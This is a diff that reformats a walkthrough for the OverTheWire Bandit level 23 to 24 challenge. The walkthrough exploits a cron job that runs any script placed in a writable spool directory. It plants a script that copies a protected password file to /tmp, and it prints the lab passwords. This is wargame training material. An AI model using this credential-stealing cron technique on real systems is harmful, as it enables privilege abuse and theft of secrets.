@@ -58,24 +58,24 @@ The script is removed after execution, so we need to:
 ssh bandit23@bandit.labs.overthewire.org -p 2220
 ```
 Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
-Step 2: Look at the cron configuration
-bash
+### Step 2: Look at the cron configuration
+```bash
 
 bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
-
+```
 Output:
-text
+```
 
 @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
-
-Step 3: Examine the script that cron runs
-bash
+```
+### Step 3: Examine the script that cron runs
+```bash
 
 bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
-
+```
 Output:
-text
+```
 
 #!/bin/bash
 
@@ -97,7 +97,7 @@ do
         rm -rf "./$i"
     fi
 done
-
+```
 This script:
 
     Changes to /var/spool/bandit24/foo/
@@ -110,26 +110,26 @@ This script:
 
     Then deletes the file
 
-Step 4: Check the spool directory structure
-bash
+### Step 4: Check the spool directory structure
+```bash
 
 bandit23@bandit:~$ ls -al /var/spool/bandit24/
 total 12
 dr-xr-x--- 3 bandit24 bandit23 4096 Apr  3 15:17 .
 drwxr-xr-x 5 root     root     4096 Apr  3 15:17 ..
 drwxrwx-wx 4 root     bandit24 4096 May 17 18:23 foo
-
+```
 The scripts need to go into /var/spool/bandit24/foo/
-Step 5: Create our script in a temporary directory
+### Step 5: Create our script in a temporary directory
 
 First, create a working directory in /tmp/:
-bash
+```bash
 
 bandit23@bandit:~$ mkdir -p /tmp/bandit24_work
 bandit23@bandit:~$ cd /tmp/bandit24_work
-
+```
 Now create our script:
-bash
+```bash
 
 bandit23@bandit:/tmp/bandit24_work$ cat > get_pass.sh << 'EOF'
 #!/bin/bash
@@ -140,18 +140,18 @@ cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
 # Also make it readable by bandit23
 chmod 644 /tmp/bandit24_password
 EOF
-
-Step 6: Make the script executable
-bash
+```
+### Step 6: Make the script executable
+```bash
 
 bandit23@bandit:/tmp/bandit24_work$ chmod +x get_pass.sh
-
-Step 7: Copy the script to the spool directory
-bash
+```
+### Step 7: Copy the script to the spool directory
+```bash
 
 bandit23@bandit:/tmp/bandit24_work$ cp get_pass.sh /var/spool/bandit24/foo/
-
-Step 8: Wait for cron to execute it (up to 1 minute)
+```
+### Step 8: Wait for cron to execute it (up to 1 minute)
 
 The cron job runs every minute. Within 60 seconds, it will:
 
@@ -161,35 +161,31 @@ The cron job runs every minute. Within 60 seconds, it will:
 
     Delete it
 
-Step 9: Check for the password file
+### Step 9: Check for the password file
 
 After waiting about 30-60 seconds:
-bash
+```bash
 
 bandit23@bandit:/tmp/bandit24_work$ ls -la /tmp/bandit24_password
-
+```
 Output:
-text
+```
 
 -rw-r--r-- 1 bandit24 bandit24 33 May 17 19:11 /tmp/bandit24_password
-
-bash
+```
+```bash
 
 bandit23@bandit:/tmp/bandit24_work$ cat /tmp/bandit24_password
-
+```
 Output:
-text
+```
 
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
 
-Step 10: Save the password
-bash
-
-echo "bandit24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" >> ~/bandit_notes.txt
-
-Step 11: Log into Level 24
-bash
+Step 10: Log into Level 24
+```bash
 
 ssh bandit24@bandit.labs.overthewire.org -p 2220
-
+```
 Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
